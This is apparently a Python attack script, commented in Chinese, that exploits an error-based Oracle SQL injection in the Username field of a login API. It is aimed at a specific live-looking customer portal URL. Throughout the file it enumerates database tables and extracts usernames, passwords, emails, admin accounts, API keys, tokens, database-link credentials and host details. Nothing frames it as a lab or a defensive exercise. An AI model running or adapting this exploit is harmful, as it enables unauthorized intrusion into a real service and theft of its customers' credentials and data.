#!/usr/bin/env python3
"""
横向移动：搜索敏感信息
1. 用户表和管理员账号
2. API密钥和Token
3. 数据库连接串
4. 配置信息
5. 其他接口
"""

import requests
import json
import time

class SensitiveInfoSearcher:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def search_user_tables(self):
        """搜索用户表"""
        print("=" * 80)
        print("👤 搜索用户表和管理员账号")
        print("=" * 80)
        
        # 搜索可能的用户表
        user_table_keywords = [
            'USER',
            'ADMIN',
            'CUSTOMER',
            'ACCOUNT',
            'LOGIN',
            'AUTH',
            'MEMBER',
            'STAFF',
            'EMPLOYEE',
        ]
        
        found_tables = []
        
        for keyword in user_table_keywords:
            print(f"\n{'='*80}")
            print(f"关键词: {keyword}")
            print(f"{'='*80}")
            
            # 搜索表名
            query = f"SELECT TABLE_NAME FROM USER_TABLES WHERE TABLE_NAME LIKE '%{keyword}%' AND ROWNUM<=5"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                print(f"  ✅ 找到表: {result}")
                found_tables.append(result)
                
                # 查询表的记录数
                time.sleep(1)
                query_count = f"SELECT COUNT(*) FROM EMS.{result}"
                count = self.extract_via_error(query_count)
                
                if count:
                    print(f"  📊 记录数: {count}")
                
                # 获取表结构
                time.sleep(1)
                query_cols = f"SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME='{result}' AND ROWNUM<=10"
                cols = self.extract_via_error(query_cols)
                
                if cols:
                    print(f"  📋 字段: {cols}")
            else:
                print(f"  未找到")
            
            time.sleep(1)
        
        return found_tables
    
    def extract_admin_accounts(self, user_tables):
        """提取管理员账号"""
        print("\n" + "=" * 80)
        print("🔑 提取管理员账号")
        print("=" * 80)
        
        for table in user_tables[:5]:  # 只检查前5个表
            print(f"\n{'='*80}")
            print(f"表: {table}")
            print(f"{'='*80}")
            
            # 尝试常见的字段名组合
            field_combinations = [
                ('USERNAME', 'PASSWORD'),
                ('USER_NAME', 'PASSWORD'),
                ('LOGIN', 'PASSWORD'),
                ('EMAIL', 'PASSWORD'),
                ('ACCOUNT', 'PASSWORD'),
                ('USERNAME', 'PASS'),
                ('USER_ID', 'PASSWORD'),
            ]
            
            for user_field, pass_field in field_combinations:
                query = f"SELECT {user_field}||'|'||{pass_field} FROM EMS.{table} WHERE ROWNUM<=5"
                result = self.extract_via_error(query)
                
                if result and 'ORA-' not in result:
                    print(f"\n  ✅ 字段组合成功: {user_field} + {pass_field}")
                    print(f"  账号信息:")
                    
                    parts = result.split('|')
                    if len(parts) >= 2:
                        print(f"    用户名: {parts[0]}")
                        print(f"    密码: {parts[1]}")
                        print(f"    🎯 可能是管理员账号！")
                    
                    # 查找admin相关账号
                    time.sleep(1)
                    query_admin = f"SELECT {user_field}||'|'||{pass_field} FROM EMS.{table} WHERE UPPER({user_field}) LIKE '%ADMIN%' AND ROWNUM<=3"
                    admin_result = self.extract_via_error(query_admin)
                    
                    if admin_result:
                        print(f"\n  🚨 Admin账号:")
                        print(f"    {admin_result}")
                    
                    break
                
                time.sleep(1)
    
    def search_api_keys(self):
        """搜索API密钥和Token"""
        print("\n" + "=" * 80)
        print("🔐 搜索API密钥和Token")
        print("=" * 80)
        
        # 搜索可能包含API密钥的表
        api_keywords = [
            'API',
            'TOKEN',
            'KEY',
            'SECRET',
            'CONFIG',
            'SETTING',
            'PARAMETER',
        ]
        
        for keyword in api_keywords:
            print(f"\n{'='*80}")
            print(f"关键词: {keyword}")
            print(f"{'='*80}")
            
            query = f"SELECT TABLE_NAME FROM USER_TABLES WHERE TABLE_NAME LIKE '%{keyword}%' AND ROWNUM<=3"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                print(f"  ✅ 找到表: {result}")
                
                # 获取样本数据
                time.sleep(1)
                query_sample = f"SELECT * FROM (SELECT ROWNUM AS RN, T.* FROM EMS.{result} T) WHERE RN=1"
                sample = self.extract_via_error(query_sample)
                
                if sample:
                    print(f"  样本: {sample}")
            
            time.sleep(1)
    
    def search_database_links_credentials(self):
        """搜索数据库连接凭证"""
        print("\n" + "=" * 80)
        print("🔗 搜索数据库连接凭证")
        print("=" * 80)
        
        # 查询DBLINK的详细信息
        query = f"SELECT DB_LINK||'|'||USERNAME||'|'||HOST FROM USER_DB_LINKS WHERE ROWNUM<=10"
        result = self.extract_via_error(query)
        
        if result:
            print(f"\nDBLINK信息:")
            parts = result.split('|')
            if len(parts) >= 3:
                print(f"  数据库: {parts[0]}")
                print(f"  用户名: {parts[1]}")
                print(f"  主机: {parts[2]}")
        
        time.sleep(2)
        
        # 查找连接串配置表
        print(f"\n搜索连接配置表...")
        
        conn_keywords = ['CONNECTION', 'DBLINK', 'DATABASE', 'SERVER']
        
        for keyword in conn_keywords:
            query = f"SELECT TABLE_NAME FROM USER_TABLES WHERE TABLE_NAME LIKE '%{keyword}%' AND ROWNUM<=3"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                print(f"  ✅ {keyword}: {result}")
            
            time.sleep(1)
    
    def search_sensitive_tables(self):
        """搜索敏感表"""
        print("\n" + "=" * 80)
        print("🔍 搜索其他敏感表")
        print("=" * 80)
        
        sensitive_keywords = [
            'PASSWORD',
            'CREDENTIAL',
            'SESSION',
            'AUTH',
            'PERMISSION',
            'ROLE',
            'ACCESS',
            'PRIVILEGE',
        ]
        
        for keyword in sensitive_keywords:
            print(f"\n关键词: {keyword}")
            
            query = f"SELECT TABLE_NAME FROM USER_TABLES WHERE TABLE_NAME LIKE '%{keyword}%' AND ROWNUM<=3"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                print(f"  ✅ {result}")
                
                # 获取记录数
                time.sleep(1)
                query_count = f"SELECT COUNT(*) FROM EMS.{result}"
                count = self.extract_via_error(query_count)
                
                if count:
                    print(f"    记录数: {count}")
            
            time.sleep(1)
    
    def check_customer_table(self):
        """检查客户表详细信息"""
        print("\n" + "=" * 80)
        print("👥 检查客户表（USER_CUSTOMER）")
        print("=" * 80)
        
        table = 'USER_CUSTOMER'
        
        # 获取表结构
        print(f"\n表结构:")
        query_cols = f"SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME='{table}' AND ROWNUM<=20"
        cols = self.extract_via_error(query_cols)
        
        if cols:
            print(f"  {cols}")
        
        time.sleep(2)
        
        # 获取管理员账号
        print(f"\n查找管理员账号:")
        
        admin_queries = [
            ("Admin用户", f"SELECT USERNAME||'|'||PASSWORD FROM EMS.{table} WHERE UPPER(USERNAME) LIKE '%ADMIN%' AND ROWNUM<=3"),
            ("高级别用户", f"SELECT USERNAME||'|'||PASSWORD FROM EMS.{table} WHERE ROLE='ADMIN' AND ROWNUM<=3"),
            ("系统账号", f"SELECT USERNAME||'|'||PASSWORD FROM EMS.{table} WHERE USERNAME LIKE 'sys%' AND ROWNUM<=3"),
        ]
        
        for name, query in admin_queries:
            result = self.extract_via_error(query)
            
            if result and 'ORA-' not in result:
                print(f"\n  ✅ {name}:")
                print(f"    {result}")
            
            time.sleep(2)
        
        # 获取任意用户样本
        print(f"\n用户样本:")
        query_sample = f"SELECT USERNAME||'|'||PASSWORD||'|'||EMAIL FROM EMS.{table} WHERE ROWNUM<=5"
        sample = self.extract_via_error(query_sample)
        
        if sample:
            print(f"  {sample}")
    
    def search_api_endpoints(self):
        """搜索API端点配置"""
        print("\n" + "=" * 80)
        print("🌐 搜索API端点和URL配置")
        print("=" * 80)
        
        # 搜索可能包含URL的表
        url_keywords = ['URL', 'ENDPOINT', 'API', 'SERVICE', 'WEB']
        
        for keyword in url_keywords:
            print(f"\n关键词: {keyword}")
            
            # 搜索表
            query = f"SELECT TABLE_NAME FROM USER_TABLES WHERE TABLE_NAME LIKE '%{keyword}%' AND ROWNUM<=3"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                print(f"  ✅ 表: {result}")
                
                # 获取数据
                time.sleep(1)
                query_data = f"SELECT * FROM (SELECT ROWNUM AS RN, T.* FROM EMS.{result} T WHERE ROWNUM<=3)"
                data = self.extract_via_error(query_data)
                
                if data:
                    print(f"  数据: {data}")
            
            time.sleep(1)
        
        # 搜索字段中包含URL的表
        print(f"\n搜索包含URL字段的表:")
        query_url_cols = f"SELECT TABLE_NAME||'.'||COLUMN_NAME FROM USER_TAB_COLUMNS WHERE COLUMN_NAME LIKE '%URL%' AND ROWNUM<=10"
        result = self.extract_via_error(query_url_cols)
        
        if result:
            print(f"  {result}")
    
    def check_system_info(self):
        """获取系统信息"""
        print("\n" + "=" * 80)
        print("💻 系统信息")
        print("=" * 80)
        
        queries = [
            ("当前用户", "SELECT USER FROM DUAL"),
            ("数据库版本", "SELECT BANNER FROM V$VERSION WHERE ROWNUM=1"),
            ("当前Schema", "SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM DUAL"),
            ("IP地址", "SELECT SYS_CONTEXT('USERENV','IP_ADDRESS') FROM DUAL"),
            ("主机名", "SELECT SYS_CONTEXT('USERENV','HOST') FROM DUAL"),
            ("会话ID", "SELECT SYS_CONTEXT('USERENV','SESSIONID') FROM DUAL"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   {result}")
            time.sleep(1)
    
    def list_all_tables(self):
        """列出所有表"""
        print("\n" + "=" * 80)
        print("📋 所有可用表（前50个）")
        print("=" * 80)
        
        query = f"SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM<=50"
        result = self.extract_via_error(query)
        
        if result:
            print(f"\n{result}")
    
    def run_search(self):
        """执行完整搜索"""
        print("=" * 80)
        print("🔍 横向移动：搜索敏感信息")
        print("=" * 80)
        
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功\n")
        
        # 执行所有搜索
        self.check_system_info()
        user_tables = self.search_user_tables()
        
        if user_tables:
            self.extract_admin_accounts(user_tables)
        
        self.check_customer_table()
        self.search_api_keys()
        self.search_database_links_credentials()
        self.search_sensitive_tables()
        self.search_api_endpoints()
        self.list_all_tables()
        
        print("\n" + "=" * 80)
        print("🎉 搜索完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    searcher = SensitiveInfoSearcher(target_url)
    searcher.run_search()
